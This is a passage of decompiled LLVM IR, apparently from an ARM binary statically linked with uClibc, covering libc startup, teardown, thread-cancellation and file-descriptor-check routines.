  br i1 %v9_165ac32, label %dec_label_pc_165b4, label %dec_label_pc_165cc

dec_label_pc_165b4:                               ; preds = %dec_label_pc_16598, %dec_label_pc_165b4.dec_label_pc_165a8_crit_edge
  %v0_165b433 = phi i32 [ %v1_165ac.pre, %dec_label_pc_165b4.dec_label_pc_165a8_crit_edge ], [ %v0_16598, %dec_label_pc_16598 ]
  store i32 %v0_165b433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_165c4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_165c4, label %dec_label_pc_165c8, label %dec_label_pc_165b4.dec_label_pc_165a8_crit_edge

dec_label_pc_165b4.dec_label_pc_165a8_crit_edge:  ; preds = %dec_label_pc_165b4
  %v0_165a8.pre = load i32, i32* @r2, align 4
  %v1_165ac.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_165a8 = inttoptr i32 %v0_165a8.pre to i32*
  %v2_165a8 = load i32, i32* %v1_165a8, align 4
  %v3_165ac = icmp uge i32 %v2_165a8, %v1_165ac.pre
  store i1 %v3_165ac, i1* %cpsr_c.global-to-local, align 1
  %v9_165ac = icmp eq i32 %v2_165a8, %v1_165ac.pre
  br i1 %v9_165ac, label %dec_label_pc_165b4, label %dec_label_pc_165cc

dec_label_pc_165c8:                               ; preds = %dec_label_pc_165b4
  %v0_165c8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_165cc

dec_label_pc_165cc:                               ; preds = %dec_label_pc_16598, %dec_label_pc_165b4.dec_label_pc_165a8_crit_edge, %dec_label_pc_165c8
  %v0_165cc = phi i32 [ %v0_165c8, %dec_label_pc_165c8 ], [ %v2_165a824, %dec_label_pc_16598 ], [ %v2_165a8, %dec_label_pc_165b4.dec_label_pc_165a8_crit_edge ]
  %v1_165cc = phi i32 [ %v0_165c8, %dec_label_pc_165c8 ], [ %v0_16598, %dec_label_pc_16598 ], [ %v1_165ac.pre, %dec_label_pc_165b4.dec_label_pc_165a8_crit_edge ]
  %v3_165cc = icmp uge i32 %v0_165cc, %v1_165cc
  store i1 %v3_165cc, i1* %cpsr_c.global-to-local, align 1
  %v9_165cc = icmp eq i32 %v0_165cc, %v1_165cc
  br i1 %v9_165cc, label %dec_label_pc_165f4.preheader, label %dec_label_pc_165cc.dec_label_pc_16598_crit_edge

dec_label_pc_165cc.dec_label_pc_16598_crit_edge:  ; preds = %dec_label_pc_165cc
  %v0_165a4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16598

dec_label_pc_165f4.preheader:                     ; preds = %dec_label_pc_165cc
  %v0_165f41 = load i32, i32* %r7.global-to-local, align 4
  %v1_165f42 = and i32 %v0_165f41, 12
  store i32 %v1_165f42, i32* @r3, align 4
  %v2_165f83 = icmp ugt i32 %v1_165f42, 3
  store i1 %v2_165f83, i1* %cpsr_c.global-to-local, align 1
  %v7_165f85 = icmp eq i32 %v1_165f42, 4
  br i1 %v7_165f85, label %dec_label_pc_165d8.lr.ph, label %dec_label_pc_165f4.preheader.dec_label_pc_16600.loopexit_crit_edge

dec_label_pc_165f4.preheader.dec_label_pc_16600.loopexit_crit_edge: ; preds = %dec_label_pc_165f4.preheader
  %v1_16604.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16600.loopexit

dec_label_pc_165d8.lr.ph:                         ; preds = %dec_label_pc_165f4.preheader
  %v0_165dc.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_165dc = add i32 %v0_165dc.pre, 132
  %v2_165f0 = inttoptr i32 %v1_165dc to i32*
  br label %dec_label_pc_165d8

dec_label_pc_165d8:                               ; preds = %dec_label_pc_165d8.lr.ph, %dec_label_pc_165d8
  %v0_165d8 = phi i32 [ %v0_165f41, %dec_label_pc_165d8.lr.ph ], [ %v3_165f0, %dec_label_pc_165d8 ]
  store i32 %v0_165d8, i32* @r2, align 4
  store i32 %v1_165dc, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_165f0 = load i32, i32* %v2_165f0, align 4
  store i32 %v3_165f0, i32* %r7.global-to-local, align 4
  %v1_165f4 = and i32 %v3_165f0, 12
  store i32 %v1_165f4, i32* @r3, align 4
  %v7_165f8 = icmp eq i32 %v1_165f4, 4
  br i1 %v7_165f8, label %dec_label_pc_165d8, label %dec_label_pc_165f4.dec_label_pc_16600.loopexit_crit_edge

dec_label_pc_165f4.dec_label_pc_16600.loopexit_crit_edge: ; preds = %dec_label_pc_165d8
  %v2_165f8 = icmp ugt i32 %v1_165f4, 3
  store i1 %v2_165f8, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_16600.loopexit

dec_label_pc_16600.loopexit:                      ; preds = %dec_label_pc_165f4.preheader.dec_label_pc_16600.loopexit_crit_edge, %dec_label_pc_165f4.dec_label_pc_16600.loopexit_crit_edge
  %v1_16604.pre = phi i32 [ %v1_16604.pre.pre, %dec_label_pc_165f4.preheader.dec_label_pc_16600.loopexit_crit_edge ], [ %v1_165dc, %dec_label_pc_165f4.dec_label_pc_16600.loopexit_crit_edge ]
  %v2_16600.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_16600

dec_label_pc_16600:                               ; preds = %dec_label_pc_16600.loopexit, %entry
  %v1_16604 = phi i32 [ %v1_16604.pre, %dec_label_pc_16600.loopexit ], [ %v0_16580, %entry ]
  %v2_16600 = phi i32 [ %v2_16600.pre, %dec_label_pc_16600.loopexit ], [ %v3_16584, %entry ]
  store i32 %v2_16600, i32* @r4, align 4
  ret i32 %v1_16604

; uselistorder directives
  uselistorder i32 %v3_165f0, { 1, 2, 0 }
  uselistorder i32 %v1_165dc, { 0, 2, 1 }
  uselistorder i32 %v0_165c8, { 1, 0 }
  uselistorder i32 %v1_165ac.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16598, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 0, 3, 5, 4, 2 }
  uselistorder label %dec_label_pc_16600.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_165d8, { 1, 0 }
  uselistorder label %dec_label_pc_165cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_165b4, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_16608 = load i32, i32* @r4, align 4
  store i32 %v3_16608, i32* %stack_var_-24, align 4
  store i32 56916, i32* %r8.global-to-local, align 4
  %v0_16610 = call i32 @__aeabi_read_tp()
  %v1_16614 = add i32 %v0_16610, -1036
  %v2_16614 = inttoptr i32 %v1_16614 to i32*
  %v3_16614 = load i32, i32* %v2_16614, align 4
  store i32 %v3_16614, i32* %r6.global-to-local, align 4
  %v1_16618 = add i32 %v0_16610, -1168
  store i32 %v1_16618, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r8.global-to-local, align 4
  %v1_1662046 = or i32 %v3_16614, 2
  store i32 %v1_1662046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1662449 = icmp eq i32 %v1_1662046, %v3_16614
  br i1 %v9_1662449, label %dec_label_pc_166d0, label %dec_label_pc_1662c

dec_label_pc_1662c:                               ; preds = %entry, %bb.dec_label_pc_1662c_crit_edge
  %v0_16630 = phi i32 [ %v0_16630.pre, %bb.dec_label_pc_1662c_crit_edge ], [ %v1_16618, %entry ]
  %v1_1662051 = phi i32 [ %v1_16620, %bb.dec_label_pc_1662c_crit_edge ], [ %v1_1662046, %entry ]
  %v0_1663450 = phi i32 [ %v1_16660, %bb.dec_label_pc_1662c_crit_edge ], [ %v3_16614, %entry ]
  store i32 %v1_1662051, i32* @r1, align 4
  %v1_16630 = add i32 %v0_16630, 132
  store i32 %v1_16630, i32* %r2.global-to-local, align 4
  store i32 %v0_1663450, i32* %r4.global-to-local, align 4
  %v1_1663834 = inttoptr i32 %v1_16630 to i32*
  %v2_1663835 = load i32, i32* %v1_1663834, align 4
  store i32 %v2_1663835, i32* @r3, align 4
  %v3_1663c37 = icmp uge i32 %v2_1663835, %v0_1663450
  store i1 %v3_1663c37, i1* %cpsr_c.global-to-local, align 1
  %v9_1663c43 = icmp eq i32 %v2_1663835, %v0_1663450
  br i1 %v9_1663c43, label %dec_label_pc_16644, label %dec_label_pc_1665c

dec_label_pc_16644:                               ; preds = %dec_label_pc_1662c, %dec_label_pc_16644.dec_label_pc_16638_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_16654 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16654, label %dec_label_pc_16658, label %dec_label_pc_16644.dec_label_pc_16638_crit_edge

dec_label_pc_16644.dec_label_pc_16638_crit_edge:  ; preds = %dec_label_pc_16644
  %v0_16638.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1663c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16638 = inttoptr i32 %v0_16638.pre to i32*
  %v2_16638 = load i32, i32* %v1_16638, align 4
  store i32 %v2_16638, i32* @r3, align 4
  %v3_1663c = icmp uge i32 %v2_16638, %v1_1663c.pre
  store i1 %v3_1663c, i1* %cpsr_c.global-to-local, align 1
  %v9_1663c = icmp eq i32 %v2_16638, %v1_1663c.pre
  br i1 %v9_1663c, label %dec_label_pc_16644, label %dec_label_pc_1665c

dec_label_pc_16658:                               ; preds = %dec_label_pc_16644
  %v0_16658 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16658, i32* @r3, align 4
  br label %dec_label_pc_1665c

dec_label_pc_1665c:                               ; preds = %dec_label_pc_1662c, %dec_label_pc_16644.dec_label_pc_16638_crit_edge, %dec_label_pc_16658
  %v1_16660 = phi i32 [ %v0_16658, %dec_label_pc_16658 ], [ %v2_1663835, %dec_label_pc_1662c ], [ %v2_16638, %dec_label_pc_16644.dec_label_pc_16638_crit_edge ]
  %v1_1665c = load i32, i32* %r6.global-to-local, align 4
  %v3_1665c = icmp uge i32 %v1_16660, %v1_1665c
  store i1 %v3_1665c, i1* %cpsr_c.global-to-local, align 1
  %v9_1665c = icmp eq i32 %v1_16660, %v1_1665c
  br i1 %v9_1665c, label %dec_label_pc_16668, label %bb

bb:                                               ; preds = %dec_label_pc_1665c
  store i32 %v1_16660, i32* %r6.global-to-local, align 4
  %v1_16620 = or i32 %v1_16660, 2
  store i32 %v1_16620, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16624 = icmp eq i32 %v1_16620, %v1_16660
  br i1 %v9_16624, label %dec_label_pc_166d0, label %bb.dec_label_pc_1662c_crit_edge

bb.dec_label_pc_1662c_crit_edge:                  ; preds = %bb
  %v0_16630.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1662c

dec_label_pc_16668:                               ; preds = %dec_label_pc_1665c
  %v0_16668 = load i32, i32* %r5.global-to-local, align 4
  %v1_16668 = and i32 %v0_16668, -69
  store i32 %v1_16668, i32* @r3, align 4
  %v2_1666c = icmp ugt i32 %v1_16668, 9
  store i1 %v2_1666c, i1* %cpsr_c.global-to-local, align 1
  %v7_1666c = icmp eq i32 %v1_16668, 10
  br i1 %v7_1666c, label %dec_label_pc_16674, label %dec_label_pc_166d0

dec_label_pc_16674:                               ; preds = %dec_label_pc_16668
  %v1_16678 = load i32, i32* %r7.global-to-local, align 4
  %v2_16678 = add i32 %v1_16678, 544
  %v3_16678 = inttoptr i32 %v2_16678 to i32*
  store i32 -1, i32* %v3_16678, align 4
  %v0_1667c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1667c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16680

dec_label_pc_16680:                               ; preds = %dec_label_pc_166b4.dec_label_pc_16680_crit_edge, %dec_label_pc_16674
  %v0_16684 = phi i32 [ %v0_16684.pre, %dec_label_pc_166b4.dec_label_pc_16680_crit_edge ], [ %v0_1667c, %dec_label_pc_16674 ]
  %v0_16680 = load i32, i32* %r7.global-to-local, align 4
  %v1_16680 = add i32 %v0_16680, 132
  %v2_16680 = inttoptr i32 %v1_16680 to i32*
  %v3_16680 = load i32, i32* %v2_16680, align 4
  store i32 %v0_16684, i32* %r2.global-to-local, align 4
  store i32 %v3_16680, i32* %r4.global-to-local, align 4
  %v1_1668c = or i32 %v3_16680, 16
  store i32 %v1_1668c, i32* @r1, align 4
  %v1_1669022 = inttoptr i32 %v0_16684 to i32*
  %v2_1669023 = load i32, i32* %v1_1669022, align 4
  %v3_1669425 = icmp uge i32 %v2_1669023, %v3_16680
  store i1 %v3_1669425, i1* %cpsr_c.global-to-local, align 1
  %v9_1669431 = icmp eq i32 %v2_1669023, %v3_16680
  br i1 %v9_1669431, label %dec_label_pc_1669c, label %dec_label_pc_166b4

dec_label_pc_1669c:                               ; preds = %dec_label_pc_16680, %dec_label_pc_1669c.dec_label_pc_16690_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_166ac = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_166ac, label %dec_label_pc_166b0, label %dec_label_pc_1669c.dec_label_pc_16690_crit_edge

dec_label_pc_1669c.dec_label_pc_16690_crit_edge:  ; preds = %dec_label_pc_1669c
  %v0_16690.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16694.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16690 = inttoptr i32 %v0_16690.pre to i32*
  %v2_16690 = load i32, i32* %v1_16690, align 4
  %v3_16694 = icmp uge i32 %v2_16690, %v1_16694.pre
  store i1 %v3_16694, i1* %cpsr_c.global-to-local, align 1
  %v9_16694 = icmp eq i32 %v2_16690, %v1_16694.pre
  br i1 %v9_16694, label %dec_label_pc_1669c, label %dec_label_pc_166b4

dec_label_pc_166b0:                               ; preds = %dec_label_pc_1669c
  %v0_166b0 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_166b4

dec_label_pc_166b4:                               ; preds = %dec_label_pc_16680, %dec_label_pc_1669c.dec_label_pc_16690_crit_edge, %dec_label_pc_166b0
  %v0_166b4 = phi i32 [ %v0_166b0, %dec_label_pc_166b0 ], [ %v2_1669023, %dec_label_pc_16680 ], [ %v2_16690, %dec_label_pc_1669c.dec_label_pc_16690_crit_edge ]
  %v1_166b4 = phi i32 [ %v0_166b0, %dec_label_pc_166b0 ], [ %v3_16680, %dec_label_pc_16680 ], [ %v1_16694.pre, %dec_label_pc_1669c.dec_label_pc_16690_crit_edge ]
  %v3_166b4 = icmp uge i32 %v0_166b4, %v1_166b4
  store i1 %v3_166b4, i1* %cpsr_c.global-to-local, align 1
  %v9_166b4 = icmp eq i32 %v0_166b4, %v1_166b4
  br i1 %v9_166b4, label %dec_label_pc_166bc, label %dec_label_pc_166b4.dec_label_pc_16680_crit_edge

dec_label_pc_166b4.dec_label_pc_16680_crit_edge:  ; preds = %dec_label_pc_166b4
  %v0_16684.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16680

dec_label_pc_166bc:                               ; preds = %dec_label_pc_166b4
  store i32 116, i32* @r3, align 4
  %v0_166c4 = load i32, i32* %r8.global-to-local, align 4
  %v2_166c4 = add i32 %v0_166c4, 116
  %v3_166c4 = inttoptr i32 %v2_166c4 to i32*
  %v4_166c4 = load i32, i32* %v3_166c4, align 4
  store i32 %v4_166c4, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_166c4)
  %v0_166d0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_166d0

dec_label_pc_166d0:                               ; preds = %entry, %bb, %dec_label_pc_16668, %dec_label_pc_166bc
  %v0_166d0 = phi i32 [ %v1_16660, %dec_label_pc_16668 ], [ %v0_166d0.pre, %dec_label_pc_166bc ], [ %v3_16614, %entry ], [ %v1_16660, %bb ]
  %v2_166d4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_166d4, i32* @r4, align 4
  ret i32 %v0_166d0

; uselistorder directives
  uselistorder i32 %v0_166b0, { 1, 0 }
  uselistorder i32 %v1_16694.pre, { 0, 2, 1 }
  uselistorder i32 %v1_16620, { 1, 2, 0 }
  uselistorder i32 %v1_1665c, { 1, 0 }
  uselistorder i32 %v1_16660, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_1663c.pre, { 1, 0 }
  uselistorder i32 %v0_1663450, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 1, 6, 10, 7, 9, 8, 2, 0 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_166d0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_166b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1669c, { 1, 0 }
  uselistorder label %dec_label_pc_1665c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16644, { 1, 0 }
  uselistorder label %dec_label_pc_1662c, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_166f4 = add i32 %tmp, 4
  %v4_166f4 = inttoptr i32 %v3_166f4 to i32*
  store i32 %arg3, i32* %v4_166f4, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_16700 = icmp eq i32 %arg2, 0
  br i1 %v2_16700, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_1670c = add i32 %tmp, 4
  %v3_1670c = inttoptr i32 %v2_1670c to i32*
  %v4_1670c = load i32, i32* %v3_1670c, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v3_16718 = phi i32 [ %tmp, %entry ], [ %v4_1670c, %bb ]
  %v4_16718 = call i32 @__libc_errno(i32 %v3_16718)
  ret i32 %v4_16718

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i32)* @__libc_errno, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_1674c.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_16728 = load i32, i32* @r4, align 4
  store i32 %v3_16728, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1674c

dec_label_pc_1674c:                               ; preds = %dec_label_pc_1674c.dec_label_pc_1674c_crit_edge, %dec_label_pc_1674c.lr.ph
  %v1_1674c = phi i32 [ %v1_16758, %dec_label_pc_1674c.dec_label_pc_1674c_crit_edge ], [ 0, %dec_label_pc_1674c.lr.ph ]
  %v0_1674c = phi i32 [ %v0_1674c.pre, %dec_label_pc_1674c.dec_label_pc_1674c_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 -8), %dec_label_pc_1674c.lr.ph ]
  %v4_1674c = mul i32 %v1_1674c, 4
  %v5_1674c = add i32 %v4_1674c, %v0_1674c
  %v6_1674c = inttoptr i32 %v5_1674c to i32*
  %v7_1674c = load i32, i32* %v6_1674c, align 4
  call void @__pseudo_branch(i32 %v7_1674c)
  %v0_16758 = load i32, i32* %r4.global-to-local, align 4
  %v1_16758 = add i32 %v0_16758, -1
  store i32 %v1_16758, i32* %r4.global-to-local, align 4
  %v2_16758 = icmp eq i32 %v0_16758, 0
  br i1 %v2_16758, label %dec_label_pc_16760, label %dec_label_pc_1674c.dec_label_pc_1674c_crit_edge

dec_label_pc_1674c.dec_label_pc_1674c_crit_edge:  ; preds = %dec_label_pc_1674c
  %v0_1674c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1674c

dec_label_pc_16760:                               ; preds = %dec_label_pc_1674c
  %v0_16764.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_16764 = add i32 %v0_16764.pre, 2008
  %v3_16764 = inttoptr i32 %v2_16764 to i32*
  %v4_16764 = load i32, i32* %v3_16764, align 4
  %v2_16768 = icmp eq i32 %v4_16764, 0
  br i1 %v2_16768, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_16760
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_16760, %bb
  %v2_16770 = xor i1 %v2_16768, true
  call void @__pseudo_cond_branch(i1 %v2_16770, i32 %v4_16764)
  %v0_16778 = load i32, i32* %r5.global-to-local, align 4
  %v2_16778 = add i32 %v0_16778, 2012
  %v3_16778 = inttoptr i32 %v2_16778 to i32*
  %v4_16778 = load i32, i32* %v3_16778, align 4
  %v2_1677c = icmp eq i32 %v4_16778, 0
  br i1 %v2_1677c, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_16784 = xor i1 %v2_1677c, true
  call void @__pseudo_cond_branch(i1 %v2_16784, i32 %v4_16778)
  %v2_16788 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16788, i32* %r4.global-to-local, align 4
  %v1_1678c = load i32, i32* @r0, align 4
  ret i32 %v1_1678c

; uselistorder directives
  uselistorder i32 %v1_16758, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_167a4 = load i32, i32* @r4, align 4
  %v6_167a4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_167b8 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_167c0 = icmp eq i32 %v2_167b8, -1
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* @r3, align 4
  br i1 %v3_167c0, label %dec_label_pc_167cc, label %dec_label_pc_167e4

dec_label_pc_167cc:                               ; preds = %entry
  %v0_167d0 = load i32, i32* @r5, align 4
  %v2_167d8 = inttoptr i32 %v0_167d0 to i64*
  %v3_167d8 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 -33916), i64* %v2_167d8)
  %v1_167dc = load i32, i32* @r4, align 4
  %v1_167e0 = icmp ne i32 %v3_167d8, %v1_167dc
  call void @__pseudo_cond_branch(i1 %v1_167e0, i32 ptrtoint (i32* @global_var_15318.961 to i32))
  br label %dec_label_pc_167e4

dec_label_pc_167e4:                               ; preds = %entry, %dec_label_pc_167cc
  %v1_167ec = phi i32 [ %v2_167b8, %entry ], [ %v3_167d8, %dec_label_pc_167cc ]
  store i32 %v3_167a4, i32* @r4, align 4
  store i32 %v6_167a4, i32* @r5, align 4
  ret i32 %v1_167ec

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_167e4, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_167f8 = load i32, i32* @r4, align 4
  store i32 %v3_167f8, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r4.global-to-local, align 4
  %v4_16808 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 148) to i32*), align 4
  %v1_1680c = inttoptr i32 %v4_16808 to i32*
  %v2_1680c = load i32, i32* %v1_1680c, align 4
  %v2_16810 = icmp eq i32 %v2_1680c, 0
  br i1 %v2_16810, label %dec_label_pc_16818, label %dec_label_pc_1683c

dec_label_pc_16818:                               ; preds = %entry
  store i32 4096, i32* %v1_1680c, align 4
  %v0_16820 = call i32 @__pthread_initialize_minimal()
  %v0_16828 = load i32, i32* %r4.global-to-local, align 4
  %v2_16828 = add i32 %v0_16828, -50356
  %v2_16830 = icmp eq i32 %v2_16828, 0
  br i1 %v2_16830, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_16818
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_16818, %bb
  %v2_16838 = xor i1 %v2_16830, true
  call void @__pseudo_cond_branch(i1 %v2_16838, i32 %v2_16828)
  %v2_1683c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1683c

dec_label_pc_1683c:                               ; preds = %entry, %bb4
  %v2_1683c = phi i32 [ %v2_1683c.pre, %bb4 ], [ %v3_167f8, %entry ]
  %.0 = phi i32 [ %v0_16820, %bb4 ], [ undef, %entry ]
  store i32 %v2_1683c, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder label %dec_label_pc_1683c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 56328, i32* %r4.global-to-local, align 4
  %v1_1685c = add i32 %tmp, 4
  store i32 %v1_1685c, i32* %ip.global-to-local, align 4
  %v2_16860 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r4.global-to-local, align 4
  %v3_1686c = mul i32 %arg2, 4
  store i32 %v3_1686c, i32* @r7, align 4
  %v4_16874 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 24) to i32*), align 4
  store i32 %v4_16874, i32* %r1.global-to-local, align 4
  store i32 56, i32* %r2.global-to-local, align 4
  %v2_1687c = add i32 %v1_1685c, %v3_1686c
  store i32 %v2_1687c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %stack_var_-416, align 4
  %v4_16884 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 56) to i32*), align 4
  store i32 %v4_16884, i32* %r4.global-to-local, align 4
  %v3_16888 = icmp uge i32 %v2_1687c, %v2_16860
  store i1 %v3_16888, i1* %cpsr_c.global-to-local, align 1
  %v9_16888 = icmp eq i32 %v2_1687c, %v2_16860
  store i1 %v9_16888, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_16890 = inttoptr i32 %v4_16884 to i32*
  store i32 %v2_1687c, i32* %v2_16890, align 4
  br i1 %v9_16888, label %bb, label %bb75

bb:                                               ; preds = %entry
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %entry, %bb
  %v0_16898 = load i32, i32* %r2.global-to-local, align 4
  %v1_16898 = load i32, i32* %r1.global-to-local, align 4
  %v2_16898 = inttoptr i32 %v1_16898 to i32*
  store i32 %v0_16898, i32* %v2_16898, align 4
  %v2_1689c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1689c, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 2012, i32* %r2.global-to-local, align 4
  %v0_168a8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_168a8, i32* @r6, align 4
  br i1 %v9_16888, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
